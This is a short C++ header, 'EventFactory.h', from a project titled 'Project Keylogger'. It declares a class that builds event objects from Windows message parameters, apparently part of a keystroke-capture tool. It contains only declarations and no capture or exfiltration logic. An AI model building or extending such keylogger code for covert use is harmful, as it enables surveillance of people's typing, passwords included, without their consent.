/**
 *						Project Keylogger
 */


#ifndef					_EVENTFACTORY_H
#define					_EVENTFACTORY_H

#include				<Windows.h>

#include				"AEvent.h"
#include				"Context.h"
#include				<chrono>
#include				<ctime>
#include				<iostream>

class  EventFactory {
public: 
    
    EventFactory();
    
    static const AEvent* create(WPARAM, LPARAM, t_Context);
};

#endif //_EVENTFACTORY_H